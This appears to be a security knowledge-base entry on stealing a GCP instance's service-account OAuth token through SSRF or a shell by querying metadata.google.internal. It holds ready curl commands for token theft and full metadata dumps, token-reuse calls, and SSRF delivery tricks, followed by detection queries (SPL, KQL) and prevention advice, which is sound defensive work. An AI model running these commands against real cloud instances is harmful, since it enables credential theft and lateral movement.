name: GCP Compute Metadata SSRF - Steal SA Access Tokens
description: Abuse an SSRF primitive (or a shell) on a GCP Compute Engine / GKE / Cloud Run instance to query metadata.google.internal and steal the attached service account's OAuth access token. GCP requires the header Metadata-Flavor: Google (and rejects X-Forwarded-For), so a usable SSRF must set custom headers; the stolen token grants the SA's permissions until it expires.
notes:
=== THE TARGET ===
  metadata.google.internal (169.254.169.254) serves the attached SA's token.
  MANDATORY header: Metadata-Flavor: Google (no header = refused). This is
  what makes GCP SSRF harder than AWS IMDSv1.

=== STEAL THE SA TOKEN (direct / shell) ===
  curl -s -H 'Metadata-Flavor: Google' \
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
  # -> {"access_token":"ya29...","expires_in":...,"token_type":"Bearer"}

=== USEFUL METADATA PATHS ===
  .../default/email       # which SA is attached
  .../default/scopes      # OAuth scopes
  .../v1/project/project-id
  .../v1/instance/attributes/   # startup-script, ssh-keys, custom attrs
  # recursive dump:
  curl -s -H 'Metadata-Flavor: Google' \
    'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'

=== USE THE STOLEN TOKEN ===
  TOKEN=ya29...
  curl -H "Authorization: Bearer $TOKEN" \
    'https://storage.googleapis.com/storage/v1/b?project=<project>'
  gcloud config set auth/access_token_file <hash_file>   # or use via REST

=== SSRF DELIVERY (web app that fetches a URL) ===
  Need to force the Metadata-Flavor header: gopher://, header-injection,
  or an app that forwards custom headers. v0.1/v1beta1 legacy endpoints
  did NOT require the header on old images.

=== NEXT ===
  Token -> enumerate project with the SA; pivot to impersonation / deploy.

defense.why_it_works: The metadata server hands any local process the attached SA's OAuth token on request. GCP's required Metadata-Flavor: Google header blocks naive SSRF, but a shell or a header-capable SSRF retrieves the token, inheriting the SA's permissions for the token's lifetime.
defense.prerequisites: An SSRF that can set the Metadata-Flavor header (or a legacy v0.1/v1beta1 image that did not require it), or any code execution on the instance; an attached service account with meaningful scopes/roles.
defense.impact: Theft of the instance SA's access token, granting its project permissions (often Cloud Storage, Compute, or broader) and enabling lateral movement, data exfiltration, and further privesc.
defense.detection: [MITRE T1552.005] Cloud Audit Logs showing the instance SA's token used from an IP outside the instance/project egress; API calls the SA has never made; VPC egress to unexpected destinations after a web request; the web app's logs show fetches to metadata.google.internal.
defense.artifacts: Audit log entries with authenticationInfo.principalEmail = the instance SA used from an external callerIp; application logs with outbound requests to 169.254.169.254 / metadata.google.internal; GKE/Cloud Run request logs.
defense.splunk_spl:
index=gcp protoPayload.authenticationInfo.principalEmail="*gserviceaccount.com"
| stats dc(protoPayload.requestMetadata.callerIp) as ips values(protoPayload.methodName) as methods by protoPayload.authenticationInfo.principalEmail
| where ips>1
defense.sentinel_kql:
GCPAuditLogs
| where PrincipalEmail endswith "gserviceaccount.com"
| summarize IPs=dcount(CallerIp), Methods=make_set(MethodName) by PrincipalEmail
| where IPs > 1
defense.prevention: Fix the SSRF (deny link-local/metadata ranges, do not forward arbitrary headers); use GKE Workload Identity instead of node SA tokens; disable legacy v0.1/v1beta1 metadata endpoints (disable-legacy-endpoints=true); attach least-privilege SAs with minimal scopes; set VPC Service Controls and egress firewall rules; alert on SA token use from outside the project.

detections.name: Instance service-account token used from an external IP
detections.logic:
GCPAuditLogs
| where PrincipalEmail endswith "gserviceaccount.com"
| summarize IPs=dcount(CallerIp), Methods=make_set(MethodName) by PrincipalEmail
| where IPs > 1
detections.false_positives: SAs legitimately used from CI/CD or on-prem via their own egress IPs
detections.tuning: Baseline each instance SA's normal caller IPs; alert on new external IPs and on API methods the SA has never called
